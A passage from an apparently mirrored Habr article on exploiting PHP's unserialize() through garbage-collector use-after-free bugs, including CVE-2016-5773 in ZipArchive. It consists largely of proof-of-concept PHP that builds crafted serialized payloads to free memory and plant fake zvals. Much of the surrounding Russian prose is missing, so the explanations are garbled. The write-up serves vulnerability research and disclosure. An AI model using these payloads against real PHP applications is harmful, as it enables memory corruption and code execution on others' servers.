'a:7:{'.$target_references.'i:9;'.$decrementor_object.'i:99;'.$decrementor_object.'i:999;'.$decrementor_object.'}'; //   2    decrementor_object. $adjust_rcs = 'i:99;a:3:{i:0;r:8;i:1;r:12;i:2;r:16;}'; //       . $trigger_gc = 'i:0;a:'.(2 + NUM_TRIGGER_GC_ELEMENTS).':{i:0;'.$free_me.$adjust_rcs.$overflow_gc_buffer.'}'; //        . $payload = 'a:2:{'.$trigger_gc.'i:0;r:3;}'; var_dump(unserialize($payload)); /* Result: array(1) { [0]=&gt; int(140531288870456) } */</span></span></code> </pre><br>  ,      <code>gc_collect_roots</code> !   ( <code>$free_me</code>   ) ,         ,         . <br><br>  Why did it happen so? <br><br><ol><li>   ,   ‚Äî .    ,   ‚Äî  . </li><li>      zval'. ,           'i:0;a:0:{}'.        zval',   'i:0;',      ,   .  ,     '[‚Ä¶]i:0;a:0:{} X i:0;a:0:{} X i:0;a:0:{}[‚Ä¶]',    X   .     ,     . </li><li>        zval.     ,    <code>var_destroy</code> ,     .           .    zval' ‚Äî  ‚Äî . </li></ol><br>      . ,        ,     ‚Äî  ,             . <br><br>      . <br><br><a name="13"></a><h3>     </h3><br>         zval'.               .           : <br><br><ul><li>   ,             zval',      zval'   zval'. </li><li> ¬´¬ª  ,    zval'   zval'.    ,      zval'  ,   . </li><li>         zval'.  ,         zval'.       ¬´¬ª . </li></ul><br>      ,       POC: <br><br><pre> <code class="php hljs">define(<span class="hljs-string"><span class="hljs-string">"GC_ROOT_BUFFER_MAX_ENTRIES"</span></span>, <span class="hljs-number"><span class="hljs-number">10000</span></span>); define(<span class="hljs-string"><span class="hljs-string">"NUM_TRIGGER_GC_ELEMENTS"</span></span>, GC_ROOT_BUFFER_MAX_ENTRIES+<span class="hljs-number"><span class="hljs-number">5</span></span>); <span class="hljs-comment"><span class="hljs-comment">//    zval',     . $fake_zval_string = pack("Q", 1337).pack("Q", 0).str_repeat("\x01", 8); $encoded_string = str_replace("%", "\\", urlencode($fake_zval_string)); $fake_zval_string = 'S:'.strlen($fake_zval_string).':"'.$encoded_string.'";'; //  ¬´¬ª : // TRIGGER_GC;FILL_FREED_SPACE;[...];TRIGGER_GC;FILL_FREED_SPACE $overflow_gc_buffer = ''; for($i = 0; $i &lt; NUM_TRIGGER_GC_ELEMENTS; $i++) { $overflow_gc_buffer .= 'i:0;a:0:{}'; $overflow_gc_buffer .= 'i:'.$i.';'.$fake_zval_string; } // decrementor_object        ($free_me). $decrementor_object = 'C:11:"ArrayObject":19:{x:i:0;r:3;;m:a:0:{}}'; //          $free_me (id=3). $target_references = 'i:0;r:3;i:1;r:3;i:2;r:3;i:3;r:3;'; //   , . . ,       . $free_me = 'a:7:{i:9;'.$decrementor_object.'i:99;'.$decrementor_object.'i:999;'.$decrementor_object.$target_references.'}'; //   2    decrementor_object. $adjust_rcs = 'i:99999;a:3:{i:0;r:4;i:1;r:8;i:2;r:12;}'; //       . $trigger_gc = 'i:0;a:'.(2 + NUM_TRIGGER_GC_ELEMENTS*2).':{i:0;'.$free_me.$adjust_rcs.$overflow_gc_buffer.'}'; //        . $stabilize_fake_zval_string = 'i:0;r:4;i:1;r:4;i:2;r:4;i:3;r:4;'; $payload = 'a:6:{'.$trigger_gc.$stabilize_fake_zval_string.'i:4;r:8;}'; $a = unserialize($payload); var_dump($a); /* Result: array(5) { [...] [4]=&gt; int(1337) } */</span></span></code> </pre><br>      ,          . <br><br>            .  ,      . ,       ¬´¬ª     20 %  'i:0;a:0:{}'. <br><br><a name="14"></a><h1> Use-after-free   ZipArchive </h1><br>  ,       ,  <a href="https://bugs.php.net/bug.php%3Fid%3D72434">PHP Bug ‚Äì ID 72434</a> ‚Äì <a href="https://cve.mitre.org/cgi-bin/cvename.cgi%3Fname%3DCVE-2016-5773">CVE-2016-5773</a> .      :       ZipArchive.         ,  . <br><br> <i>   zval'  ,    (   )        .</i> <br><br>        .        ,         <code>php_zip_get_properties</code> .     -  .   : <br><br><pre> <code class="php hljs">$serialized_string = <span class="hljs-string"><span class="hljs-string">'a:1:{i:0;a:3:{i:1;N;i:2;O:10:"ZipArchive":1:{s:8:"filename";i:1337;}i:1;R:5;}}'</span></span>; $array = unserialize($serialized_string); gc_collect_cycles(); $filler1 = <span class="hljs-string"><span class="hljs-string">"aaaa"</span></span>; $filler2 = <span class="hljs-string"><span class="hljs-string">"bbbb"</span></span>; var_dump($array[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-comment"><span class="hljs-comment">/* Result: array(2) { [1]=&gt; string(4) "bbbb" [...] */</span></span></code> </pre><br>  ,         zval',    .      ,   : <br><br> <code>[...] i:1;N; [...] s:8:"filename";i:1337; [...] i:1;R:REF_TO_FILENAME; [...]</code> <br> <br>    NULL   1,       .     ‚Äúi:1;REF_TO_FILENAME; [‚Ä¶] s:8:‚Äùfilename‚Äù;i:1337; [‚Ä¶]‚Äù.       ,     zval' ‚Äúfilename‚Äù  ,     -  . <br><br><a name="15"></a><h1>  Conclusion </h1><br>          .    ,   .            .     ,         ,        . <br><br>             PHP-:    .        ,   .          .   :   ,         . <br><br>    ,      ,       .     ,    ,          PHP.   ,     :        ,         JSON. <br><br>  ,              pornhub.com.      PHP    . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a2f/0cd/99c/a2f0cd99c0807b54a2823e2234d306e9.gif" alt="image"><br> <sup>  zval'  -  .</sup> </div><p>Source: <a href="https://habr.com/ru/post/308242/">https://habr.com/ru/post/308242/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../308228/index.html">How Clojure helps speed up the writing of Selenium tests</a></li>
<li><a href="../308232/index.html">How it works and what the ‚Äúdeep‚Äù integration of ‚ÄúBitrix24‚Äù and the UniSender email newsletter service can do</a></li>
<li><a href="../308234/index.html">What is lead</a></li>
<li><a href="../308236/index.html">Linux Vulnerability Audit with Vulners.com</a></li>
<li><a href="../308240/index.html">Arrays in PHP 7: Hash Tables</a></li>
<li><a href="../308246/index.html">OpenStreetView launch</a></li>
<li><a href="../308248/index.html">Trello Clone on Phoenix and React. Parts 6-7</a></li>
<li><a href="../308254/index.html">Choosing an html-parser for Apache.JMeter</a></li>
<li><a href="../308256/index.html">The creation of the game "Words from the Word"</a></li>
<li><a href="../308258/index.html">Why do you need SSL security certificates in 3CX Phone System</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>